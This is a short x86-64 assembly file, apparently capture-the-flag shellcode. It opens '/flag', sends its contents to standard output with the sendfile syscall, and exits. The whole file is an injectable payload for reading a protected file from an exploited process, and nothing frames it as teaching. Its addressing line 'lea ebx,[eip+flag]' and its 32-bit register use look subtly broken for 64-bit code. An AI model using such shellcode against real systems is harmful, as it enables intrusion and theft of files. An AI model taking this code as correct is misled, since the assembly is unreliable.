.intel_syntax noprefix
.global _start
_start:
	lea ebx,[eip+flag]
	mov eax,2
	mov edi,ebx
	mov esi,0
	syscall
	
	mov edi,1
	mov esi,eax
	mov edx,0
	mov r10,1000
	mov eax,40
	syscall

	mov eax,60
	syscall

flag:
	.string "/flag"


